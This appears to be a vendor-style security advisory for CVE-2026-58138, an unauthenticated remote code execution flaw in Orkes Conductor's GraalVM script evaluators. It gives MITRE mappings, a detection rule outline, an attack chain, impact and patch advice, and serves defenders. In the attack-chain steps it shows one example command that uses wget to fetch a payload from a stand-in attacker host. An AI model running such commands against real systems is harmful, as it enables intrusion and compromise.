---
title: 'CVE-2026-58138: Unauthenticated Remote Code Execution in Orkes Conductor'
slug: 2026-06-orkes-conductor-rce
description: An unauthenticated remote code execution vulnerability (CVE-2026-58138) in Orkes Conductor allows attackers to execute arbitrary OS commands by submitting malicious JavaScript or Python expressions within inline workflow definitions to the workflow API endpoint before authentication, leveraging unsandboxed GraalVM evaluators through specific task types to invoke system commands via Java reflection or direct subprocess calls.
date: "2026-06-30T19:20:22Z"
lastmod: "2026-09-18T09:27:05Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - RCE
  - vulnerability
  - Java
  - Conductor
  - web-application
vendors:
  - Orkes
products:
  - Conductor 3.21.21 (< 3.30.2)
  - Conductor 3.30.1
  - Conductor (< 3.30.2)
affected_os:
  - Linux
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: Orkes Conductor 3.21.21 before 3.30.2 contains an unauthenticated remote code execution vulnerability that allows remote attackers to execute arbitrary OS commands by submitting inline workflow definitions containing malicious JavaScript or Python expressions to the workflow API endpoint prior to authentication.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: malicious JavaScript or Python expressions to the workflow API endpoint prior to authentication.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: malicious JavaScript or Python expressions to the workflow API endpoint prior to authentication.
    confidence_band: high
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-58138
  - https://sploitus.com/exploit?id=21D020CF-21B0-55A8-BA7E-316F76903171&utm_source=rss&utm_medium=rss
  - https://www.securityweek.com/critical-orkes-conductor-vulnerability-exploited-in-attacks/
iocs:
  - type: url
    value: https://sploitus.com/exploit?id=21D020CF-21B0-55A8-BA7E-316F76903171
  - type: url
    value: https://www.vulncheck.com/advisories/orkes-conductor-unauthenticated-rce-via-graalvm-script-evaluators
ioc_counts:
  url: 2
rules:
  - title: Detects CVE-2026-58138 Post-Exploitation - Suspicious Child Process from Java (Linux)
    description: Detects suspicious process creation by a Java process, potentially indicating post-exploitation activity following CVE-2026-58138 or other RCE vulnerabilities in Java applications. Looks for common shell interpreters or download utilities.
    platform: sigma
    severity: high
    tactics:
      - command_and_control
      - execution
    techniques:
      - T1059
      - T1071.001
    data_sources:
      - process_creation
      - linux
rules_count: 1
updates:
  - at: "2026-06-30T20:04:15Z"
    level: L2
    summary: poc_available; OS linux
    sources:
      - sploitus
  - at: "2026-09-18T09:27:05Z"
    level: L2
    summary: conductor 3.21.21 version < 3.30.2
    sources:
      - securityweek
    source_urls:
      - https://www.securityweek.com/critical-orkes-conductor-vulnerability-exploited-in-attacks/
---

A critical unauthenticated remote code execution vulnerability, tracked as CVE-2026-58138, affects Orkes Conductor versions 3.21.21 before 3.30.2. This flaw enables remote attackers to execute arbitrary operating system commands on the underlying server without prior authentication. The vulnerability stems from the ability to submit inline workflow definitions containing malicious JavaScript or Python expressions directly to the workflow API endpoint. Attackers can exploit unsandboxed GraalVM evaluators, configured with `HostAccess.ALL` or `allowAllAccess(true)`, through `INLINE`, `LAMBDA`, `DO_WHILE`, and `SWITCH` task types. This allows for the invocation of arbitrary system commands via Java reflection or direct subprocess calls, posing a severe risk of complete system compromise and data exfiltration.

## Attack Chain

1.  An attacker identifies an internet-exposed Orkes Conductor instance running a vulnerable version (e.g., 3.21.21 up to 3.30.1).
2.  The attacker crafts a specialized workflow definition payload containing embedded malicious JavaScript or Python expressions.
3.  These expressions are designed to leverage Java reflection or direct subprocess calls to execute arbitrary OS commands (e.g., `bash -c 'wget evil.com/payload.sh'`).
4.  The crafted workflow definition is submitted to the unauthenticated workflow API endpoint of the vulnerable Orkes Conductor instance.
5.  Orkes Conductor processes the submitted inline workflow, and the unsandboxed GraalVM evaluator begins to parse and execute the malicious expressions.
6.  The GraalVM evaluator, configured with permissive access settings like `HostAccess.ALL`, executes the attacker's embedded code.
7.  The malicious code successfully executes arbitrary OS commands on the host system, achieving unauthenticated remote code execution.

## Impact

The successful exploitation of CVE-2026-58138 allows unauthenticated attackers to achieve full remote code execution on the server hosting Orkes Conductor. With a CVSS v3.1 Base Score of 9.8 (Critical), this vulnerability can lead to complete system compromise, including sensitive data exfiltration, installation of backdoors, lateral movement within the network, and deployment of ransomware. Organizations utilizing vulnerable versions of Orkes Conductor face an immediate and severe risk if their instances are publicly accessible.

## Recommendation

*   Patch CVE-2026-58138 immediately by upgrading Orkes Conductor to version 3.30.2 or later.
*   Implement network segmentation to restrict direct internet exposure of Orkes Conductor instances.
*   Deploy the provided Sigma rule to detect suspicious process execution originating from the Conductor application.
*   Monitor for unusual outbound network connections from the Conductor server, indicative of command and control or data exfiltration activities.
